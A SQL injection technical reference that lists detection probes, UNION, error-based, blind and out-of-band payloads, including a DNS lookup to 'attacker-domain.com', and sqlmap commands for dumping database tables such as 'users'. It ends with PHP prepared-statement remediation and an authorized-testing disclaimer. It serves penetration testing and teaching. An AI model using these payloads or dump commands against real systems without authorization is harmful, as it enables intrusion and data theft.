SQL Injection (SQLi) Technical Reference Guide

📌 Description

SQL Injection (SQLi) is a critical web vulnerability that allows an attacker to interfere with the queries an application makes to its database. This allows attackers to view, modify, or delete sensitive data, and in some cases, achieve Remote Code Execution (RCE).

🔍 SQLi Detection Methodology

To find SQLi, look for input fields, URL parameters, headers, or cookies that interact with a database back-end.

1. Triggering an Error

Inject special characters into parameters to break the database query syntax:

'

"

`

')

")

;


2. Boolean Tests

Inject logical operators to verify if the application responds differently:

' OR 1=1 -- -

' OR 1=2 -- -


3. Mathematical Evaluation

Inject expressions to test if parameters are evaluated numerically:

Target /item.php?id=5 with /item.php?id=6-1

If the application returns the same result for both, numerical input is being evaluated.

⚡ SQLi Categories & Practical Payloads

1. In-Band (Classic) SQLi

Data is extracted using the same channel used to launch the attack.

A. UNION-Based SQLi

Used when query results are returned directly in the application's response.

Determine Column Count: Increment until an error or change in response occurs:

' ORDER BY 1 -- -

' ORDER BY 2 -- -

' ORDER BY 3 -- -


Determine Column Data Types: Look for which columns can hold string data:

' UNION SELECT 'a', NULL -- -

' UNION SELECT NULL, 'a' -- -


Retrieve Data (Targeting Database Version):

MySQL/MariaDB: ' UNION SELECT @@version, NULL -- -

PostgreSQL: ' UNION SELECT version(), NULL -- -

Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -

Oracle: ' UNION SELECT banner, NULL FROM v$version -- -

B. Error-Based SQLi

Used when the response contains raw database error messages, forcing the database to leak sensitive data inside the error details.

UpdateXML Vector (MySQL):

' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- -


ExtractValue Vector (MySQL):

' AND extractvalue(1,concat(0x7e,database())) -- -


2. Inferential (Blind) SQLi

No data is transferred directly in the response. Attackers reconstruct the data by asking the database "True" or "False" questions.

A. Boolean-Based Blind

The application response changes structure depending on whether the query evaluates to True or False.

Payload Example (MySQL): Test if the first character of the database name is "a":

' AND SUBSTRING(database(),1,1)='a' -- -


B. Time-Based Blind

The attacker forces the database to pause (sleep) before responding to verify if a condition is True.

MySQL Payload:

' AND IF(1=1, SLEEP(5), 0) -- -


PostgreSQL Payload:

' AND (SELECT 1 FROM PG_SLEEP(5)) -- -


Microsoft SQL Server Payload:

' IF(1=1) WAITFOR DELAY '0:0:5' -- -


3. Out-of-Band (OAST) SQLi

Forces the database to initiate an out-of-bound network request (DNS or HTTP) to a server under your control.

DNS Lookup Vector (Oracle):

' UNION SELECT UTL_INADDR.get_host_address('attacker-domain.com') FROM dual -- -


🛠️ Automated Testing (SQLMap Guide)

When manual validation is completed, SQLmap can automate the exploitation phase.

Basic GET Scan

sqlmap -u "http://target.com/page.php?id=1" --batch


Scan with an HTTP Request File

Save the full raw request from Burp Suite into request.txt:

sqlmap -r request.txt -p id --batch


Database Enumeration & Dumping

# Get database names
sqlmap -r request.txt -p id --dbs

# List tables in a specific database
sqlmap -r request.txt -p id -D target_db --tables

# Dump data from a specific table
sqlmap -r request.txt -p id -D target_db -T users --dump


Advanced Optimization Flags

sqlmap -r request.txt --level=3 --risk=2 --threads=5


🛡️ Remediation & Prevention

1. Primary Prevention (Prepared Statements)

Ensures the database treats user input strictly as data, never as executable SQL code.

Insecure PHP Implementation:

$query = "SELECT * FROM users WHERE username = '" . $user . "'";


Secure PHP Implementation (PDO Prepared Statement):

$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $user]);


2. Input Validation & Sanitization

Use strict allow-lists for expected data types (e.g., ensuring an ID is strictly an integer).

3. Principle of Least Privilege

Ensure the database user account used by the web application only has the permissions required to run (e.g., no administrative or file-system read/write permissions).

⚠️ Legal Disclaimer

All techniques documented here are for authorized testing and educational purposes only. Never test against systems without explicit written permission.
